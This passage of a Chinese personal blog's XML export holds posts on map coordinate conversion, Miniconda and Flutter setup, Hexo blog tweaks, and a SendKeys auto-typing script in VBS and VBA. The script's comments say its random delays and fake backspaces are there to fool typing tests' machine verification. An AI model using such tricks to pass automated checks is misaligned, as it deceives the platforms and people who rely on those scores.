<p>加完点，感觉有点伤感。这么多年，走过的路不是很顺心。<br>过去就过去吧，翻篇了，再怀念也没有用。不知道未来如何，但是越努力，越幸运。</p>
]]></content>
      <tags>
        <tag>足迹</tag>
        <tag>百度地图</tag>
      </tags>
  </entry>
  <entry>
    <title>做成我的足迹续</title>
    <url>/2021/03/25/%E5%81%9A%E6%88%90%E6%88%91%E7%9A%84%E8%B6%B3%E8%BF%B9%E7%BB%AD/</url>
    <content><![CDATA[<h1 id="做成我的足迹续"><a href="#做成我的足迹续" class="headerlink" title="做成我的足迹续"></a>做成我的足迹续</h1><p><em>光阴荏苒，日月如梭，往事随风，飘散而过。</em><br>距离上次写的文章<a href="https://xuchunlei.top/2019/11/21/%E5%81%9A%E6%88%90%E6%88%91%E7%9A%84%E8%B6%B3%E8%BF%B9/">做成我的足迹</a>已经过去490天，期间足迹增加了一点点。最近很忙加上确实没有啥能写的，就鸽了很久（106天）。这周开始才稍微有点时间，想着写点东西，因为手里有一些半成品拿不出手，就想到之前的足迹还有让我pass的地图，然后就开始了XX补全（橙汁）计划<sub>最近EVA新剧场版反响不小啊</sub>。</p>
<h4 id="谷歌地图"><a href="#谷歌地图" class="headerlink" title="谷歌地图"></a>谷歌地图</h4><p>使用需要结算账号（绑定银行卡），账号劝退！国家地区里没有中国选项（也没有朝鲜），有港澳台地区。这里选的香港，因为要国际通用的银行卡，然而我并没有。<br><img src="/img/20210325/1.png" alt><br>后来发现国家地区选择日本可以使用PayPal，可以绑定银联卡，这里就没有再尝试了。补完失败……<br><img src="/img/20210325/2.png" alt></p>
<h4 id="高德地图"><a href="#高德地图" class="headerlink" title="高德地图"></a>高德地图</h4><p>高德只能国内用，国外的点只能看看。经纬度数据使用了之前百度地图的，但是因为坐标系不一样，不能直接使用,需要把百度坐标BD-09转成火星坐标GCJ-02。</p>
<blockquote>
<p>WGS-84坐标系：地心坐标系，GPS原始坐标体系</p>
<blockquote>
<p>国内不允许使用</p>
</blockquote>
<p>GCJ-02 坐标系：火星坐标系</p>
<blockquote>
<p>国测局02年发布的坐标体系，它是一种对经纬度数据加入随机的偏差的加密算法<br>互联网地图在国内必须至少使用GCJ-02进行首次加密</p>
</blockquote>
<p>BD-09坐标系</p>
<blockquote>
<p>百度中国地图所采用的坐标系，由GCJ-02进行进一步的偏移算法得到</p>
</blockquote>
</blockquote>
<p>其他功能基本类似，稍微修改一下就能了，直接上<a href="https://xuchunlei.top/myTrailsAMap" target="_blank">展示页面（代码）</a>和效果图。<br><img src="/img/20210325/3.png" alt></p>
<h4 id="必应地图"><a href="#必应地图" class="headerlink" title="必应地图"></a>必应地图</h4><p>国内国外都能用，经纬度依旧使用百度的，国内的经纬度<code>只要转成GCJ-02就可以了</code>,<code>只要转成GCJ-02就可以了</code>,<code>只要转成GCJ-02就可以了</code>。重要的事情说三遍，这里坑了一下，以为国内的坐标也要转换成WGS-84GPS原始坐标。其他功能除了行政区划polygon，基本类似。行政区划polygon用的高德地图API获取行经纬度数据，然后用必应地图的polygon描绘。还有必应地图开发中心账号登录的时候需要科学上网一下，其他都不需要。这里列一下用到的网址，然后上<a href="https://xuchunlei.top/myTrailsBingMap" target="_blank">展示页面（代码）</a>和效果图。<br><a href="https://www.bingmapsportal.com/" target="_blank" rel="noopener">必应地图开发中心</a><br><a href="https://cn.bing.com/maps/sdkrelease/mapcontrol/isdk/loadmapasync" target="_blank" rel="noopener">必应地图Demo</a><br><a href="https://docs.microsoft.com/en-us/bingmaps/v8-web-control/map-control-api/" target="_blank" rel="noopener">必应地图API参考</a><br><img src="/img/20210325/4.png" alt></p>
<h4 id="雅虎地图"><a href="#雅虎地图" class="headerlink" title="雅虎地图"></a>雅虎地图</h4><p>额，API终止服务……<br><img src="/img/20210325/5.png" alt></p>
<p>只简单修改了一下，样式什么的懒得微调了，毕竟之前的百度地图的样式也不咋地。国内其他的还有腾讯地图，搜狗地图貌似都是自己的坐标系，估计以后也不会再搞了。</p>
]]></content>
      <tags>
        <tag>足迹</tag>
        <tag>高德地图</tag>
        <tag>必应地图</tag>
      </tags>
  </entry>
  <entry>
    <title>初识Anaconda</title>
    <url>/2025/04/28/%E5%88%9D%E8%AF%86Anaconda/</url>
    <content><![CDATA[<p><em>接受朋友建议，开始学习AI相关的东西，简单记录下</em></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://www.anaconda.com/" target="_blank" rel="noopener">Anaconda</a>一个Python类库集成安装包，几乎包含了所有数据分析，人工智能的相关类库。<br>Anaconda有两个版本<br><img src="/img/20250428_2/3.png" alt></p>
<ol>
<li>Anaconda Distribution：会自动安装其中的300多个标准数据科学和机器学习包，自带图像用户界面Anaconda Navigator（基于conda构建的桌面应用程序）。</li>
<li>Miniconda：是一个更轻量级的发行版，仅包含conda、python、它们的依赖项和少量其他包。</li>
</ol>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://www.anaconda.com/download" target="_blank" rel="noopener">官方下载</a>，选择跳过注册<br><img src="/img/20250428_2/1.png" alt></p>
<p>选择对应的版本，我这里下载了Miniconda的Windows版本<br><img src="/img/20250428_2/2.png" alt></p>
<p>打开下载的安装包，直接下一步<br><img src="/img/20250428_2/4.png" alt></p>
<p>同意服务条款<br><img src="/img/20250428_2/5.png" alt></p>
<p>这里我选择 仅我（推荐）- 为当前用户帐户安装 Miniconda 然后下一步<br>另一个选项 所有用户 - 为计算机上的所有用户帐户安装 Miniconda（需要 Windows 管理员权限）。<br><img src="/img/20250428_2/6.png" alt></p>
<p>将路径改为D盘，然后下一步，这样包pkgs和环境envs安装路径也就变成D盘了<br><img src="/img/20250428_2/7.png" alt></p>
<p>这里安装选项什么都不选，然后安装</p>
<ul>
<li>创建快捷方式 - 默认选中。为 Anaconda Prompt 包创建“开始”菜单快捷方式。取消选择此选项会跳过创建这些快捷方式。</li>
<li>将 Miniconda3 添加到我的 PATH 环境变量 - 将包含 conda 二进制文件的路径添加到您的 PATH 环境变量。<br>Anaconda 不建议选择此选项。conda 二进制文件路径包含其他软件包二进制文件，即使当前没有激活任何 conda 环境，这些文件也会永久添加到您的 PATH 环境变量中。这使得其他软件可以使用这些软件包文件，这可能会导致错误。</li>
<li>将 Miniconda3 注册为我的默认 Python 3.12。将此安装中的 Python 包注册为 VSCode、PyCharm 等程序的默认 Python。</li>
<li>完成后清除包缓存 - 在安装完成后运行 conda clean –all –force-pkgs-dirs。<br><img src="/img/20250428_2/8.png" alt></li>
</ul>
<p>安装完成后，然后下一步<br><img src="/img/20250428_2/9.png" alt></p>
<p>取消勾选，然后下一步，安装完成<br><img src="/img/20250428_2/10.png" alt></p>
<p>因为没有配置环境变量，直接在安装路径Scripts中打开命令提示符才能执行<code>conda</code>命令<br>可以执行以下操做查看是否安装成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看conda版本</span><br><span class="line">conda --version</span><br><span class="line">conda -V</span><br><span class="line">#查看conda信息</span><br><span class="line">conda info</span><br><span class="line">#查看conda所有包</span><br><span class="line">conda list</span><br></pre></td></tr></table></figure>

<p><img src="/img/20250428_2/11.png" alt></p>
<h3 id="更换Anaconda下载源"><a href="#更换Anaconda下载源" class="headerlink" title="更换Anaconda下载源"></a>更换Anaconda下载源</h3><p>为了提高下载速度，这里选择清华大学镜像源<br>Windows需要执行<code>conda config --set show_channel_urls yes</code>生成<code>.condarc</code>文件进行修改，Win+R运行中输入<code>%USERPROFILE%</code>打开生成文件位置，根据<a href="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/" target="_blank" rel="noopener">清华大学镜像源</a>提示进行修改<br><img src="/img/20250428_2/12.png" alt></p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>conda中的环境是独立的隔离空间，您可以在其中安装特定版本的软件包，包括依赖项、库和 Python 版本。这种隔离有助于避免包版本之间的冲突，并确保项目具有所需的确切库和工具。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看环境信息 --envs可以简写为-e</span><br><span class="line">conda info --envs</span><br><span class="line"></span><br><span class="line">#创建环境helloWorld --name可以简写为-n</span><br><span class="line">#conda create --name &lt;ENV_NAME&gt; &lt;PACKAGE&gt;=&lt;VERSION&gt;</span><br><span class="line">conda create --name helloWorld python=3.11.5</span><br></pre></td></tr></table></figure>

<p><img src="/img/20250428_2/13.png" alt></p>
<p>输入<code>y</code>回车下载依赖（后续同版本python创建环境时无需再下载，可以直接使用）<br><img src="/img/20250428_2/14.png" alt></p>
<p>使用环境前需要初始化<br><code>conda init</code><br><img src="/img/20250428_2/15.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#激活环境</span><br><span class="line">conda activate helloWorld</span><br><span class="line">#停用环境</span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure>

<p><img src="/img/20250428_2/16.png" alt></p>
<p>在环境中安装包，并执行<br><code>conda install numpy=2.2.4</code><br><img src="/img/20250428_2/17.png" alt></p>
<p>删除环境<br><code>conda env remove -n helloWrold</code><br><img src="/img/20250428_2/18.png" alt></p>
]]></content>
      <tags>
        <tag>Anaconda</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>初识Flutter-安装和环境配置</title>
    <url>/2021/09/13/%E5%88%9D%E8%AF%86Flutter-%E5%AE%89%E8%A3%85%E5%92%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p><em>新项目需要用到Flutter，于是开始学习，先搞下环境，写个Hello World！</em></p>
<h3 id="Flutter介绍"><a href="#Flutter介绍" class="headerlink" title="Flutter介绍"></a>Flutter介绍</h3><p>Flutter是Google开源的UI工具包，帮助开发者通过一套代码库高效构建多平台精美应用，支持移动、Web、桌面和嵌入式平台。以上摘自<a href="https://flutter.cn/" target="_blank" rel="noopener">Flutter官方</a>。刚开始学习可以参考<a href="https://flutter.cn/docs" target="_blank" rel="noopener">Flutter中文教程</a>。</p>
<h3 id="安装和环境配置-Win10-64位"><a href="#安装和环境配置-Win10-64位" class="headerlink" title="安装和环境配置(Win10 64位)"></a>安装和环境配置(Win10 64位)</h3><p>获取最新的Flutter SDK压缩包，这里版本是2.5.0，要查看其他发行通道和以往的版本，请参阅<a href="https://flutter.cn/docs/development/tools/sdk/releases" target="_blank" rel="noopener">SDK版本列表</a>页面。这里解压到D盘根目录，并配置环境变量path，添加flutter\bin目录。命令提示符窗口运行<code>flutter doctor</code>检测运行环境（这里出错了一次，不过不影响结果，两次都是）提示缺少Android SDK。<img src="/img/20210913/1.png" alt></p>
<h4 id="配置Android开发环境"><a href="#配置Android开发环境" class="headerlink" title="配置Android开发环境"></a>配置Android开发环境</h4><p>现在<a href="https://developer.android.google.cn" target="_blank" rel="noopener">Android开发官网</a>里Android SDK集成到Android Studio，直接下载Android Studio即可。之前想单独装Android SDK的，15年开始就没有更新了，结果各种错误，最后放弃。</p>
<blockquote>
<p><del>单独装Android SDK失败过程，请忽略<br>这里直接从<a href="https://www.androiddevtools.cn/" target="_blank" rel="noopener">AndroidDevTools</a>单独下载Android SDK压缩包。依旧解压到D盘根目录，文件夹改名为android-sdk。启动SDK Manager.exe，默认选项，直接单击Install XX Packages按钮，弹出框中选中Accept License单选框（每个Packages大项都要点），然后单机Install按钮开始安装，下载需要一段时间。新建环境变量ANDROID_SDK_ROOT到android-sdk目录。配置环境变量path添加%ANDROID_SDK_ROOT%\tools和%ANDROID_SDK_ROOT%\platform-tools两条记录。命令提示符窗口执行<code>adb --version</code>出现版本号表示Android SDK环境安装成功。<br>这里有个问题，就是获取的版本不是最新的，只到29，在SDK Manager.exe貌似没法再提升版本了，开发要用API30和31的，也没有。在<code>sdkmanager --list</code>中是能找到新的版本的，通过<code>sdkmanager --update</code>能把Android SDK Platform-tools 升级到最新的31.0.3。通过<code>sdkmanager &quot;build-tools;30.0.3&quot; &quot;platforms;android-30&quot;</code>和<code>sdkmanager &quot;build-tools;31.0.0&quot; &quot;platforms;android-31&quot;</code>更新编译和开发调试工具。<br>命令提示符窗口运行<code>flutter doctor</code>检测运行环境，新错误cmdline-tools component is missing。命令提示符窗口连接到android-sdk\tools\bin目录，执行<code>sdkmanager &quot;cmdline-tools;latest&quot;</code>安装（Flutter提示多一个–install参数），Accept? (y/N):输入y回车。<br>然后还有一个同意 Android 协议，执行<code>flutter doctor --android-licenses</code>，一路y回车。最后只剩一个[!] Android Studio (not installed)，因为没用Android Studio，忽略。<br>执行AVD Manager.exe创建虚拟设备启动，提示图片没用，明明路径都存在……最后尝试无果，最后放弃，重新去下载了Android Studio</del></p>
</blockquote>
<p>安装Android Studio，这里把SDK安装路径改为了D盘<br><img src="/img/20210913/2.png" alt><br>安装完成后通过More Actions-SDK Manager来管理Android SDK。模拟器AVD Manager在下面<br><img src="/img/20210913/3.png" alt><br>新建环境变量ANDROID_SDK_ROOT到android-sdk目录。命令提示符窗口执行<code>flutter doctor</code>检测运行环境，提示cmdline-tools component is missing，安装cmdline-tools<br><img src="/img/20210913/4.png" alt><br>同意Android协议：执行<code>flutter doctor --android-licenses</code>，一路y回车，此时执行<code>flutter doctor</code>检测运行环境，全部通过<br><img src="/img/20210913/5.png" alt><br>配置Android模拟器的时候需要自己按需求下载用到的照片（模拟器是真的大，默认用户文件夹，对应C盘吃紧的我雪上加霜。改路径需要新建环境变量ANDROID_ADV_HOME以及删除默认路径.android后新建）<br><img src="/img/20210913/6.png" alt></p>
<h4 id="编辑工具设定"><a href="#编辑工具设定" class="headerlink" title="编辑工具设定"></a>编辑工具设定</h4><p>Flutter支持Android Studio、IntelliJ、VS Code以及传说中的编辑器Emacs，这里我用的Visual Studio Code（yyds）<br>打开VS Code，Ctrl+Shift+p打开命令面板，输入install选择Install Extensions，扩展搜索输入框中输入flutter选择Flutter并单击Install按钮（会安装Dart插件）。Enabled&gt;Reload Required重新启动 VS Code。命令面板中输入doctor选择 Flutter: Run Flutter Doctor，输出 (OUTPUT) 面板不报错表示安装完成（就是<code>flutter doctor</code>，只不过多个了参数<code>-v</code>）</p>
<h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><p>Ctrl+Shift+p打开命令面板，输入flutter，选择Flutter: New Application Project创建项目文件夹。输入项目名称，确定后在项目目录中就会生成main.dart文件。选择要启动的设备，启动（按F5），就能看到自带的示例程序<br><img src="/img/20210913/7.png" alt><br>这里改为“祖传代码”，用chorme启动，效果如下<br><img src="/img/20210913/8.png" alt><br>开发环境搞完就要开始正式学习了，至此文章就水完了，感觉官方<a href="https://flutter.cn/docs" target="_blank" rel="noopener">Flutter中文教程</a>的文档更好，要想入坑可以去看看。</p>
]]></content>
      <tags>
        <tag>Flutter</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>博客修改路上的一些事</title>
    <url>/2019/11/10/%E5%8D%9A%E5%AE%A2%E4%BF%AE%E6%94%B9%E8%B7%AF%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="博客修改路上的一些事"><a href="#博客修改路上的一些事" class="headerlink" title="博客修改路上的一些事"></a>博客修改路上的一些事</h1><p><em>有些事情去搞了才发现坎坷不断，但是不去做的话不管好的还是坏的都没有。</em></p>
<p>因为自己加了一张背景，修改了部分css的透明度，但是周五晚发现，手机自带浏览器(小米)透明度显示异常，背景都表示出来了，手机的Chrome就显示正常。<br>难道是内核的原因？看了一下自带浏览器的内核确实差距挺大的。</p>
<div align="center"><img src="/img/20191110/1.png"></div>

<p>周六早早打开电脑(比上班早)，弄一下环境发现提交到GitHbub的代码不全，Hexo的主题文件未提交上去，因为修改过主题，不能直接用它原来的，凉凉。<br><img src="/img/20191110/2.png" alt><br>另外用ie浏览器发现和手机自带浏览器一样的效果。但是电脑有点老，ie8，开发者模式看不到任何错误。</p>
<p>无奈跑了趟公司，发现.gitignore文件并没有忽略主题下的文件。原因可能是clone主题时产生的隐藏文件.git的影响。最后删掉多余的git相关文件，push成功。<br>公司电脑ie11与edge显示的背景都有问题，F12发现颜色无法识别十六进制颜色，修改为rgba格式后解决。<br><img src="/img/20191110/3.png" alt></p>
<p>晚上回来提交修改时发现，GitHub的commit记录有问题，全部都是我另一个账号的。不管是账户密码提交还是通过本账号ssh方式提交，都是别的账户（包含自己的私有库）。<br>然后想了一下共通点，都是通过git提交的，难道和git的config有关？git提交时主要配置了user.name和user.email，发现两台电脑配置的用户名应该不一样，那么原因应该出在user.email上了。<br>然后验证自己的猜想(还要了朋友的邮箱往实验)，果然是，GitHub是通过这个来显示用户名的。<br><img src="/img/20191110/4.jpg" alt><br>如果配置的user.email和当前账户不一样时，这个提交记录只在项目里能看到，个人页面是不会做记录的。</p>
<p>期间加了一个友情链接和标签页，对于背景音乐还是去比较好吧，加载有点慢(本地加载)，而且页面刷新还有问题(主题限定，设置为自动播放的时候，js报错)没去解决。<br>微博大概的雏形就这样了。</p>
]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>制作一个简单的博客</title>
    <url>/2019/11/07/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="制作一个简单的博客"><a href="#制作一个简单的博客" class="headerlink" title="制作一个简单的博客"></a>制作一个简单的博客</h1><p><em>没错，说的就是这个，算是第一篇博客文章吧</em></p>
<p>基于博客框架<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a>+<a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a>，通过<a href="http://www.markdown.cn/" target="_blank" rel="noopener">Markdown</a>来书写文章。无域名，无服务器，如果没有什么特殊需求的话，金钱投入0。网上这方面文章烂大街了，这里不做详细介绍。</p>
<p><a href="https://nodejs.org" target="_blank" rel="noopener">Node.js</a>,<a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>默认都会，不解释。</p>
<blockquote>
<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2></blockquote>
<p>看官网教程就可以，我只看了一点。Hexo有很多主题，找自己喜欢的就行。我的是在<a href="https://github.com/Fechin/hexo-theme-diaspora" target="_blank" rel="noopener">Diaspora</a>基础上改的，主要加了网页背景。</p>
<h4 id="这里补充两点："><a href="#这里补充两点：" class="headerlink" title="这里补充两点："></a>这里补充两点：</h4><ul>
<li>主题下载命名问题<br>有的主题带hexo-theme-的前缀，放到themes文件夹的时候要去掉这个。</li>
<li>主题自定义Front-Matter<br>这个每个主题设置的可能都不一样，比如Diaspora的文章封面参数cover就是自己定义的。</li>
</ul>
<blockquote>
<h2 id="GitHub-Pages"><a href="#GitHub-Pages" class="headerlink" title="GitHub Pages"></a>GitHub Pages</h2></blockquote>
<p>申请一个GitHub账号，新建一个和账号名字一样的仓库即可。不过可能找不到你想要的名字（大部分都被申请过了，比如这个账号的名字就是在我想要的基础上变换出来的）。<br>以前写过关于GithubPage的文章，可以点击<a href="https://mp.weixin.qq.com/s/nm1OPwHY4Lz8ClHroPZZJA" target="_blank" rel="noopener">这里</a>查看。</p>
<blockquote>
<h2 id="额外补充"><a href="#额外补充" class="headerlink" title="额外补充"></a>额外补充</h2></blockquote>
<p><em>到这才知道，GitHub不同账号不能绑定相同的ssh<br>手动部署到GitHub，发现评论不能用，原来还需要配置Gitalk（主题限定）</em></p>
]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>博客修改路上的一些事续</title>
    <url>/2019/11/12/%E5%8D%9A%E5%AE%A2%E4%BF%AE%E6%94%B9%E8%B7%AF%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%BB%AD/</url>
    <content><![CDATA[<h1 id="博客修改路上的一些事续"><a href="#博客修改路上的一些事续" class="headerlink" title="博客修改路上的一些事续"></a>博客修改路上的一些事续</h1><p><em>完善了博客的一些基本功能，到这里基本能够见人了吧，手动滑稽。</em><br><em>好久没投入这么多精力搞一件事情了，果然写代码（bug）是件很快乐的事情。</em></p>
<p>最近一直在想怎么完善自己的第一个博客网站（伪，实际上就是一个域名），然后更改了以下方面。</p>
<h4 id="http-→-https"><a href="#http-→-https" class="headerlink" title="http → https"></a>http → https</h4><p>这个很好弄，本来还从阿里云申请了一个免费的SSH证书，发现完全用不上。GitHub Pages可以直接设置https加载。<br>Settings &gt; Options &gt; GitHub Pages 中勾选Enforce HTTPS选项<br><img src="/img/20191112/1.png" alt><br>（还有一个方法是通过Cloudflare（后面会介绍）来控制，Page Rule中设置）</p>
<h4 id="添加访问统计"><a href="#添加访问统计" class="headerlink" title="添加访问统计"></a>添加访问统计</h4><p>插件是<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子</a>,基本没有碰壁，就是文章的阅读数不好加，因为有的连接过去页面没有刷新，计数不增加。暂时没加（以后也可能不加）。<br>反而朋友添加的时候遇到了<a href="http://waygc.net/blog/read/1573545160250" target="_blank" rel="noopener">问题</a>，最后也只能添加主页的访问统计。</p>
<h4 id="添加音乐列表"><a href="#添加音乐列表" class="headerlink" title="添加音乐列表"></a>添加音乐列表</h4><p>插件是<a href="http://jplayer.org/" target="_blank" rel="noopener">jPlayer</a>,找了一些，有列表的好像不多，最后选了这个。通过<a href="https://link.hhtjim.com/" target="_blank" rel="noopener">外链转换工具</a>转成mp3的地址，但是有些收费的歌曲有时可能会失效。改写了jPlayer的sample文件，然后改写到md文件中。页面写死，没嵌入到主题中，不能通过配置文件更改。<br>插曲，为了适配手机端，改写了它的css文件，然而不知道啥原因，GitHub Pages编译不通过或不反映更改。最后用行内样式解决的。<br><img src="/img/20191112/2.png" alt></p>
<h4 id="修改DNS提高访问速度"><a href="#修改DNS提高访问速度" class="headerlink" title="修改DNS提高访问速度"></a>修改DNS提高访问速度</h4><p>因为GitHub Pages是国外的，访问速度是真的头疼。压缩了图片的大小，效果依然很差（20到30s，或者以上）。然后想起朋友之前写的文章<a href="https://rudymemo.com/2019/09/26/GitHub-DNS/" target="_blank" rel="noopener">GitHub个人网站修改DNS，解决国内访问慢的问题</a>,然后试着做了，效果拔群。基本五六秒加载完。<br><a href="https://www.cloudflare.com/" target="_blank" rel="noopener">Cloudflare</a>还是很不错的，有免费的dns（收费版更强大）。CDN加速，ip随机，请求分析……<br><img src="/img/20191112/3.png" alt></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>上次说的背景音乐问题，最后只能禁用自动播放了。算是解决，可喜可贺。<br>另外这篇文章不是直接发出的。因为自己的失误，GitHub上代码没提交全，只能branch新分支，明天merge发布了（开发和静态文件生成还是有差距的）。又正式体验了一下git的功能。</p>
]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>如何快速提高打字速度(伪,脚本调用键盘)</title>
    <url>/2020/05/10/%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E6%8F%90%E9%AB%98%E6%89%93%E5%AD%97%E9%80%9F%E5%BA%A6-%E4%BC%AA-%E8%84%9A%E6%9C%AC%E8%B0%83%E7%94%A8%E9%94%AE%E7%9B%98/</url>
    <content><![CDATA[<h2 id="如何快速提高打字速度-伪-脚本调用键盘"><a href="#如何快速提高打字速度-伪-脚本调用键盘" class="headerlink" title="如何快速提高打字速度(伪,脚本调用键盘)"></a>如何快速提高打字速度(伪,脚本调用键盘)</h2><p><em>本来想搞一个自动复制代码的脚本，后来发现可以用来打字。但是大部分语言模拟键盘主要为了自动化测试……</em></p>
<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>最早的起因是在B站看了一个用VBA做游戏的视频（然而过去了一个多月，咕咕咕），被视频里写代码的速度被震惊到了(其实视频中所写的代码都是提前大致打好草稿的)，然后就有了自动打(复制)代码的想法。<br>效果演示如下。</p>
<p><img src="/img/20200510/1.gif" alt></p>
<p>只支持键盘上有的按键（英文和字符）。你有中文键盘的话，就当我没说。</p>
<p><img src="/img/20200510/2.png" alt></p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><h4 id="1-VBS"><a href="#1-VBS" class="headerlink" title="1 VBS"></a>1 VBS</h4><p>最简单暴力的就是VBS，代码简单，速度可控（对打字的模拟最好），但是Windows限定。<br>有设定2秒延迟，最后会在你鼠标（光标）点的位置开始输出。不过要通过打字程序的验证还是有点问题的，以后的代码都没有做这一步。<br>如果你读取的文件过长，想中途停下只能通过杀进程……</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;---------------------</span><br><span class="line">&apos;VBS打字脚本</span><br><span class="line">&apos;只支持英文和字符</span><br><span class="line">&apos;author xuchl</span><br><span class="line">&apos;---------------------</span><br><span class="line"></span><br><span class="line">dim wshshell</span><br><span class="line">set wshshell = createobject(&quot;wscript.shell&quot;)</span><br><span class="line">&apos;打开一个记事本</span><br><span class="line">&apos;wshshell.run &quot;notepad&quot;</span><br><span class="line">wscript.sleep 2000</span><br><span class="line"></span><br><span class="line">&apos;随机延迟设定</span><br><span class="line">dim max, min, num</span><br><span class="line">max = 90</span><br><span class="line">min = 40</span><br><span class="line"></span><br><span class="line">dim fso, f, str, schar</span><br><span class="line">set fso = createobject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">&apos;数据来源文件</span><br><span class="line">set f = fso.opentextfile(&quot;C:\Users\xuchl\Desktop\test.txt&quot;, 1, false)</span><br><span class="line"></span><br><span class="line">do until f.atendofstream</span><br><span class="line">	str = f.ReadLine()</span><br><span class="line">	for i = 1 to len(str)</span><br><span class="line">		&apos;逐行逐个读取字符</span><br><span class="line">		schar = mid(str, i, 1)</span><br><span class="line">		&apos;替换特殊字符</span><br><span class="line">		schar = replace(schar, &quot;+&quot;, &quot;+=&quot;)</span><br><span class="line">		schar = replace(schar, &quot;^&quot;, &quot;+6&quot;)</span><br><span class="line">		schar = replace(schar, &quot;%&quot;, &quot;+5&quot;)</span><br><span class="line">		schar = replace(schar, &quot;&#123;&quot;, &quot;+[&quot;)</span><br><span class="line">		schar = replace(schar, &quot;&#125;&quot;, &quot;+]&quot;)</span><br><span class="line">		schar = replace(schar, &quot;(&quot;, &quot;+9&quot;)</span><br><span class="line">		schar = replace(schar, &quot;)&quot;, &quot;+0&quot;)</span><br><span class="line">		schar = replace(schar, &quot;~&quot;, &quot;+`&quot;)</span><br><span class="line">		wshshell.sendkeys schar</span><br><span class="line">		&apos;随机延迟</span><br><span class="line">		num = Int((max - min + 1) * Rnd + min)</span><br><span class="line">		wscript.sleep num</span><br><span class="line">		&apos;打字模拟用-退格(为了让测试成绩通过机器验证)</span><br><span class="line">		if num &lt; 45 then</span><br><span class="line">			wshshell.sendkeys schar</span><br><span class="line">			wscript.sleep Int((max - min + 1) * Rnd + min)</span><br><span class="line">			wshshell.sendkeys &quot;&#123;BACKSPACE&#125;&quot;</span><br><span class="line">		end if</span><br><span class="line">	next</span><br><span class="line">    wshshell.sendkeys &quot;&#123;ENTER&#125;&quot;</span><br><span class="line">loop</span><br><span class="line"></span><br><span class="line">f.Close()</span><br><span class="line">set f = nothing</span><br><span class="line">set fso = nothing</span><br></pre></td></tr></table></figure>

<h4 id="1-5-VBA"><a href="#1-5-VBA" class="headerlink" title="1.5 VBA"></a>1.5 VBA</h4><p>和VBS类似，但是延迟不好控制。本来还想弄个VB.NET的，但是懒于没有环境，都是Microsoft的产品都差不多。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;---------------------</span><br><span class="line">&apos;VBA打字脚本</span><br><span class="line">&apos;只支持英文和字符</span><br><span class="line">&apos;author xuchl</span><br><span class="line">&apos;---------------------</span><br><span class="line">Sub vbaTyper()</span><br><span class="line"></span><br><span class="line">Dim fileRoot$, curChar$</span><br><span class="line">Dim targetStr</span><br><span class="line"></span><br><span class="line">fileRoot = &quot;C:\Users\xuchl\Desktop\test.txt&quot;</span><br><span class="line"></span><br><span class="line">&apos;读取文本内容</span><br><span class="line">targetStr = Split(ReadUTF(fileRoot), vbCrLf)</span><br><span class="line">If (UBound(targetStr) = 0) Then</span><br><span class="line">    targetStr = Split(targetStr(0), vbLf) &apos;换行符不是\r\n时，以\n重新换行</span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">&apos;延迟两秒</span><br><span class="line">&apos;延迟毫秒级不好控制，用Windows API函数Sleep可以但是不想</span><br><span class="line">delay (2)</span><br><span class="line"></span><br><span class="line">For i = 0 To UBound(targetStr)</span><br><span class="line">    For m = 1 To Len(targetStr(i))</span><br><span class="line">        curChar = Mid(targetStr(i), m, 1)</span><br><span class="line">        curChar = Replace(curChar, &quot;+&quot;, &quot;+=&quot;)</span><br><span class="line">        curChar = Replace(curChar, &quot;^&quot;, &quot;+6&quot;)</span><br><span class="line">        curChar = Replace(curChar, &quot;%&quot;, &quot;+5&quot;)</span><br><span class="line">        curChar = Replace(curChar, &quot;&#123;&quot;, &quot;+[&quot;)</span><br><span class="line">        curChar = Replace(curChar, &quot;&#125;&quot;, &quot;+]&quot;)</span><br><span class="line">        curChar = Replace(curChar, &quot;(&quot;, &quot;+9&quot;)</span><br><span class="line">        curChar = Replace(curChar, &quot;)&quot;, &quot;+0&quot;)</span><br><span class="line">        curChar = Replace(curChar, &quot;~&quot;, &quot;+`&quot;)</span><br><span class="line">        </span><br><span class="line">        SendKeys curChar</span><br><span class="line">        delay (0.5)</span><br><span class="line">    Next</span><br><span class="line">Next</span><br><span class="line"></span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Function ReadUTF(ByVal FileName As String) As String</span><br><span class="line">    With CreateObject(&quot;ADODB.Stream&quot;)</span><br><span 